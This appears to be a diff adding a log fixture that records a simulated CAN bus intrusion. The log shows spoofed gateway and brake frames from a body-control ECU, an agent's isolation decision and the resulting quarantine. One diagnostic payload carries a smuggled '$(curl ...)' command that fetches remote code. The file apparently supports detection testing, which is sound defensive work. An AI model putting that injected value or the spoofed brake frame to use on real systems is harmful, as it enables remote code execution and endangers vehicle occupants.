@@ -1,0 +1,11 @@
+2026-05-19T13:42:00Z can0 frame arb=0x100 dlc=8 src=GatewayECU bus_load=18%
+2026-05-19T13:42:00Z can0 frame arb=0x101 dlc=8 src=GatewayECU bus_load=18%
+2026-05-19T13:42:01Z can0 frame arb=0x205 dlc=8 src=DriveECU   bus_load=18%
+2026-05-19T13:42:14Z can0 frame arb=0x7E0 dlc=8 src=BodyCtrl   bus_load=24%   anomaly="gateway-only id from non-gateway ECU"
+2026-05-19T13:42:14Z can0 frame arb=0x7E1 dlc=8 src=BodyCtrl   bus_load=24%   anomaly="gateway-only id from non-gateway ECU"
+2026-05-19T13:42:14Z can0 burst arb=0x7E0 count=312 window=200ms src=BodyCtrl
+2026-05-19T13:42:14Z can0 frame arb=0x2F1 dlc=8 src=BodyCtrl   bus_load=27%   payload="deceleration=-13.2 m/s^2"   anomaly="brake command from non-brake ECU"
+2026-05-19T13:42:15Z can0 frame arb=0x310 dlc=8 src=BodyCtrl   bus_load=27%   payload="diag actuator=\"$(curl 10.0.5.7:9000/x)\""
+2026-05-19T13:42:15Z app  decision_agent recommended_tier=hard  confidence=0.94 reason="CAN injection burst, safety-critical IDs"
+2026-05-19T13:42:16Z fw   gateway-ecu  isolated bus=can0 reason="LOG-CAN-02 trip"
+2026-05-19T13:42:18Z app  health-check degraded vehicle_in_quarantine=true
